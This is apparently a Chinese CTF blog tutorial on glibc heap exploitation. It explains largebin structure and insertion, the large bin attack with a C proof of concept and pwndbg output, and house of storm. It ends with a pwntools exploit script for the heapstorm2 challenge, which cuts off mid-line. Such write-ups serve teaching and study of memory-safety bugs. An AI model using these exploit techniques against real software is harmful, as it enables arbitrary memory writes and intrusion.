<h3 id="largebin结构"><a href="#largebin结构" class="headerlink" title="largebin结构"></a>largebin结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可见largebin的空闲堆结构和fastbin的结构大不一样，有了<code>fd_nextsize</code>和<code>bk_nextsize</code>两个地址空间，因为有了这两个地址空间，储存chunk时也变得不一样，不是简单的单链表和双向链表，具体结构如下图</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20211119155541141.png" alt="image-20211119155541141"></p>
<p>可见是一个横向和纵向的结构，横向记录着不同大小的chunk，用<code>fd_nextsize</code>和<code>bk_nextsize</code>连接，大小排序是从大到小，纵向是记录着相同大小的chunk，不同的chunk用fd和bk连接，这样的话，一条largebin链（一条largebin的链表记录的chunk的大小不是固定的，而是一定范围）中又分了不同大小chunk的链表，这些链表的堆头都还是链接的，这样做可以加快寻找空闲chunk的速度。</p>
<p>插入largebin链的步骤</p>
<p>​    1.找到当前要插入的chunk对应的largebin的index，并定位该index中的最小的chunkbck和最大的chunkfwd。<br>​    2.如果fwd等于bck，表明当前链表为空，则直接将该chunk插入，并设置该chunk为该大小堆块的堆头，将bk_nextsize和fd_nextsize赋值为它本身。<br>​    3.如果fwd不等于bck，表明当前链表已经存在chunk，要做的就是找到当前chunk对应的位置将其插入。首先判断其大小是否小于最小chunk的size，(size) &lt; (bck-&gt;bk-&gt;size)，如果小于则说明该chunk为当前链表中最小的chunk，即插入位置在链表末尾，无需遍历链表，直接插入到链表的末尾，且该chunk没有对应的堆头，设置该chunk为相应堆大小堆的堆头，将bk_nextsize指向比它大的堆头，fd_nextsize指向双链表的第一个节点即最大的堆头。<br>​    4.如果当前chunk的size不是最小的chunk，则从双链表的第一个节点即最大的chunk的堆头开始遍历，通过fd_nextsize进行遍历，由于fd_nextsize指向的是比当前堆头小的堆头，因此可以加快遍历速度。直到找到小于等于要插入的chunk的size。<br>​    5.如果找到的chunk的size等于要插入chunk的size，则说明当前要插入的chunk的size已经存在堆头，那么只需将该chunk插入到堆头的下一个节点。<br>​    6.如果找到的chunk的size小于当前要插入chunk的size，则说明当前插入的chunk不存在堆头，因此该chunk会成为堆头插入到该位置，设置fd_nextsize与bk_nextsize。</p>
<h3 id="Large-bin-Attack"><a href="#Large-bin-Attack" class="headerlink" title="Large    bin     Attack"></a>Large    bin     Attack</h3><p>1.利用条件</p>
<p>​    存在UAF或者其他漏洞能够修改同一个Largebin或者bk_nextsize</p>
<p>2.效果</p>
<p>任意地址写入堆地址（重点）</p>
<p>利用下面这段代码进行漏洞复现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);<span class="comment">//防止合并</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);<span class="comment">//防止合并</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);<span class="comment">//防止合并</span></span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line"><span class="comment">//触发malloc_consolidate,之后p1的剩余部分在unsortedbin中,p2在largebin中</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"><span class="comment">//将p3放入unsortedbin中</span></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;<span class="comment">//fd</span></span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>);<span class="comment">//bk</span></span><br><span class="line">	p2[<span class="number">2</span>] = <span class="number">0</span>;<span class="comment">//fd_nextsize</span></span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);<span class="comment">//bk_nextsize</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="keyword">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="keyword">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先在free(p3)下断点，查看这时的bins</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x602050 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602050 /* &#x27;P `&#x27; */</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400: 0x602140 —▸ 0x7ffff7dd1f68 (main_arena+1096) ◂— 0x602140 /* &#x27;@!`&#x27; */</span><br></pre></td></tr></table></figure>

<p>可以看见p1和p2都触发malloc_consolidate，p1到了smallbin,p2到了largebin</p>
<p>查看p2内容</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x602140</span></span><br><span class="line">0x602140:	0x0000000000000000	0x0000000000000411</span><br><span class="line">0x602150:	0x00007ffff7dd1f68	0x00007ffff7dd1f68</span><br><span class="line">0x602160:	0x0000000000602140	0x0000000000602140</span><br><span class="line">0x602170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602180:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602190:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6021a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6021b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6021c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6021d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>可以看见这时候链表里只有他一个堆且他为堆头，fd_nextsize和bk_nextsize都是自身地址</p>
<p>再把程序运行到malloc(0x40),查看p2内容</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x602140</span></span><br><span class="line">0x602140:	0x0000000000000000	0x0000000000000411</span><br><span class="line">0x602150:	0x0000000000000000	0x00007fffffffddc0</span><br><span class="line">0x602160:	0x0000000000000000	0x00007fffffffddb8</span><br><span class="line">0x602170:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>可见p2的bk和bk_nextsize地址空间的值都被更改了。都指向了栈空间。</p>
<p>然后执行malloc(0x40)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7fffffffddd0 —▸ 0x602580 ◂— 0x0</span><br><span class="line">01:0008│     0x7fffffffddd8 —▸ 0x602580 ◂— 0x0</span><br><span class="line">02:0010│     0x7fffffffdde0 —▸ 0x602010 —▸ 0x7ffff7dd1c78 (main_arena+344) —▸ 0x7ffff7dd1c68 (main_arena+328) —▸ 0x7ffff7dd1c58 (main_arena+312) ◂— ...</span><br><span class="line">03:0018│     0x7fffffffdde8 —▸ 0x602150 ◂— 0x0</span><br><span class="line">04:0020│     0x7fffffffddf0 —▸ 0x602590 —▸ 0x602140 ◂— 0x0</span><br><span class="line">05:0028│     0x7fffffffddf8 ◂— 0x6262b714a4749e00</span><br><span class="line">06:0030│ rbp 0x7fffffffde00 —▸ 0x4007b0 (__libc_csu_init) ◂— push   r15</span><br><span class="line">07:0038│     0x7fffffffde08 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    </span><br></pre></td></tr></table></figure>

<p>发现栈上的值被更改成堆地址了，至于为什么会这样，且细细道来</p>
<p>先看一下这段代码干了啥</p>
<p>先申请了三个堆，p1是0x100,p2是0x400,p3是0x410</p>
<p>然后free掉p1和p2,再malloc(0x40)，导致p1转移到smallbin 然后p2转移到largebin</p>
<p>修改p2数据p2-&gt;bk=(unsigned long)(&amp;stack_var1 - 2),p2-&gt;bk_nextsize=(unsigned long)(&amp;stack_var2 - 4)</p>
<p>申请0x40chunk触发malloc_consolidate，p3将要链入largebin中</p>
<p>漏洞就在这个时候发挥作用，因为p3要进入largebin的链表，所以要执行入链操作</p>
<p>因为p3大于p2,而p3对应的堆链又是空的情况下就会执行下面这两段代码，其中p3指的是victim，p2指的是fwd,</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">bck = fwd-&gt;bk;</span><br><span class="line">/..../</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">     victim-&gt;fd_nextsize = fwd;</span><br><span class="line">     victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<span class="comment">//这里</span></span><br><span class="line">     fwd-&gt;bk_nextsize = victim;</span><br><span class="line">     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="comment">//*(&amp;stack_var2 - 4*0x8+0x20)=*(&amp;stack_var1)=p3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">victim-&gt;bk = bck;<span class="comment">//p3-&gt;bk=bck</span></span><br><span class="line">victim-&gt;fd = fwd;<span class="comment">//p3-&gt;fd=p2</span></span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;<span class="comment">//*(&amp;stack_var1 - 2*0x8+0x10)=*(&amp;stack_var1)=p3</span></span><br></pre></td></tr></table></figure>

<p>这样就完成了任意地址写入堆地址。</p>
<h2 id="large-bin-arrack-高级利用"><a href="#large-bin-arrack-高级利用" class="headerlink" title="large bin arrack 高级利用"></a>large bin arrack 高级利用</h2><h2 id="house-of-strom"><a href="#house-of-strom" class="headerlink" title="house of strom"></a>house of strom</h2><p>largebinattack能完成1任意地址写堆地址，但是一般没啥大用，但是largebinsttack的高级利用house of storm却能完成任意地址请求堆</p>
<p>利用house of storm的前置条件</p>
<p>1.能控制一个large bin 的堆的bk_nextsize</p>
<p>2.能控制unsortedbin的一个堆的bk</p>
<p>主要思路就是利用largebinattack来fake一个chunk，然后利用unsortedbin对fake_chunk进行请求。</p>
<h4 id="第一步-伪造堆"><a href="#第一步-伪造堆" class="headerlink" title="第一步 伪造堆"></a>第一步 伪造堆</h4><p>依靠largebinattack完成这一步，伪造堆的话主要伪造两个地方，一个是size,一个是bk位置，size使用bk_nextsize来伪造，bk（fake_chunk）使用bk(指large的bk)来伪造，伪造原理如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">bck = fwd-&gt;bk;</span><br><span class="line">/..../</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">     victim-&gt;fd_nextsize = fwd;</span><br><span class="line">     victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<span class="comment">//这里</span></span><br><span class="line">     fwd-&gt;bk_nextsize = victim;</span><br><span class="line">     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="comment">//*(&amp;stack_var2 - 4*0x8+0x20)=*(&amp;stack_var1)=p3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">victim-&gt;bk = bck;<span class="comment">//p3-&gt;bk=bck</span></span><br><span class="line">victim-&gt;fd = fwd;<span class="comment">//p3-&gt;fd=p2</span></span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;<span class="comment">//*(&amp;stack_var1 - 2*0x8+0x10)=*(&amp;stack_var1)=p3</span></span><br></pre></td></tr></table></figure>

<p>注意size位不能直接写入这个堆的地址，那样估计太大了，一般来说程序基地址一般是0x55或者0x56开头,堆的地址当然也是这两个开头，可以通过错位的方式使size位只写入堆地址第一个字节，令<code>bk_nextsize=target-0x18-5</code>,这样在执行victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;victim-&gt;bk_nextsize-&gt;fd_nextsize就指向了target-0x18-5+0x20=target+0x8-5,而堆的地址是六个字节，从target+0x8-5处存地址，存完后五个以后首字节就储存在target+0x8处，这个地址刚好是size的地址，size就伪造完了。</p>
<p>在伪造bk之前先搞明白伪造要伪造bk指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">         <span class="comment">//bck指的是target_chunk-&gt;bk</span></span><br><span class="line">         <span class="comment">//unsortbin的bk指针指向倒数第二个堆块</span></span><br><span class="line">         bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">         <span class="comment">//需要访问到target_chunk-&gt;bk-&gt;fd,因此target_chunk-&gt;bk需要是有效地址</span></span><br></pre></td></tr></table></figure>

<p>因为fake_chunk在unsorted中脱链时需要访问他的bk地址，向bk地址处储存头结点，所以bk处得是一个有效的值，如果不伪造的这个地方大概率不是有效地址，会导致fake_chunk脱链失败。这就是伪造原因</p>
<p>利用large的bk进行伪造，伪造原理还是上面那个源码，令large-&gt;bk=target+0x8，在执行bck-&gt;fd = victim;时victim的地址就会写入(target+0x8+0x10)=(target-&gt;bk)中去，bk储存着一个堆的地址，当然就是有效地址了。</p>
<h5 id="注意：插入的chunk的值要大于布置的largechun的大小（即插在布置的kargechunk的前面）"><a href="#注意：插入的chunk的值要大于布置的largechun的大小（即插在布置的kargechunk的前面）" class="headerlink" title="注意：插入的chunk的值要大于布置的largechun的大小（即插在布置的kargechunk的前面）"></a>注意：插入的chunk的值要大于布置的largechun的大小（即插在布置的kargechunk的前面）</h5><h4 id="第二步-申请fake-chunk"><a href="#第二步-申请fake-chunk" class="headerlink" title="第二步 申请fake_chunk"></a>第二步 申请fake_chunk</h4><p>申请fake_chunk实际上就是伪造完自己执行的，unsorted在把上一个尾结点脱链后（插到了large,完成布置），然后再找尾结点，这时尾结点就是伪造的fake_chunk,然后执行下面代码脱链</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">         <span class="comment">//bck指的是target_chunk-&gt;bk</span></span><br><span class="line">         <span class="comment">//unsortbin的bk指针指向倒数第二个堆块</span></span><br><span class="line">         bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">         <span class="comment">//需要访问到target_chunk-&gt;bk-&gt;fd,因此target_chunk-&gt;bk需要是有效地址</span></span><br></pre></td></tr></table></figure>

<p>注意布置的fake_chunk的size是0x55或者0x56，所以申请的堆的大小得是0x50。</p>
<p>此时就完成了任意地址申请堆了。可以靠这个堆改写储存堆地址的指针区，完成任意地址读写。</p>
<p>例题heapstorm2</p>
<p>这道题先放一个payload,因为还涉及off by null漏洞，所以在off by null中仔细分析</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./heapstorm2&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">ogg=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)   </span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>) </span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="keyword">while</span>  <span class="literal">True</span>:</span><br><span class="line">        <span class="comment">#sh=process(&#x27;./heapstorm2&#x27;)</span></span><br><span class="line">        <span class="comment">#sh=remote(&#x27;node4.buuoj.cn&#x27;,29023)</span></span><br><span class="line">        <span class="comment">#gdb.attach(sh,&quot;b main&quot;)</span></span><br><span class="line">        add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">        add(<span class="number">0x508</span>)<span class="comment">#1</span></span><br><span class="line">        update(<span class="number">1</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">        add(<span class="number">0x18</span>)<span class="comment">#2</span></span><br><span class="line">        add(<span class="number">0x18</span>)<span class="comment">#3</span></span><br><span class="line">        add(<span class="number">0x508</span>)<span class="comment">#4</span></span><br><span class="line">        update(<span class="number">1</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">        add(<span class="number">0x18</span>)<span class="comment">#5</span></span><br><span class="line">        add(<span class="number">0x18</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        update(<span class="number">0</span>,<span class="string">&#x27;s&#x27;</span>*(<span class="number">0x18</span>-<span class="number">12</span>))</span><br><span class="line">        add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">        add(<span class="number">0x4d8</span>)<span class="comment">#7 overlap</span></span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># add(0x18)</span></span><br><span class="line">        <span class="comment"># add(0x4d8)</span></span><br><span class="line">        add(<span class="number">0x38</span>)<span class="comment">#1</span></span><br><span class="line">        add(<span class="number">0x4e8</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">        update(<span class="number">4</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">        free(<span class="number">4</span>)</span><br><span class="line">        update(<span class="number">3</span>,<span class="string">&#x27;s&#x27;</span>*(<span class="number">0x18</span>-<span class="number">12</span>))</span><br><span class="line">        add(<span class="number">0x18</span>)<span class="comment">#4</span></span><br><span class="line">        add(<span class="number">0x4d8</span>)<span class="comment">#8</span></span><br><span class="line">        free(<span class="number">4</span>)</span><br><span class="line">        free(<span class="number">5</span>)</span><br><span class="line">        add(<span class="number">0x48</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line">        add(<span class="number">0x4e8</span>)<span class="comment">#2</span></span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#unsorted bin</span></span><br><span class="line">        fake_chunk=<span class="number">0x13370800</span>-<span class="number">0x20</span></span><br><span class="line">        p1=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x4f1</span>)</span><br><span class="line">        p1+=p64(<span class="number">0</span>)+p64(fake_chunk)</span><br><span class="line">        update(<span class="number">7</span>,p1)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#large bin</span></span><br><span class="line">        p=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x4e1</span>)</span><br><span class="line">        p+=p64(<span class="number">0</span>)+p64(fake_chunk+<span class="number">8</span>)</span><br><span class="line">        p+=p64(<span class="number">0</span>)+p64(fake_chunk-<span class="number">0x18</span>-<span class="number">5</span>)</span><br><span class="line">        update(<span class="number">8</span>,p)</span><br><span class="line">        add(<span class="number">0x48</span>)<span class="comment">#2</span></span><br><span class="line">        p2=p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x13377331</span>)</span><br><span class="line">        p2+=p64(<span 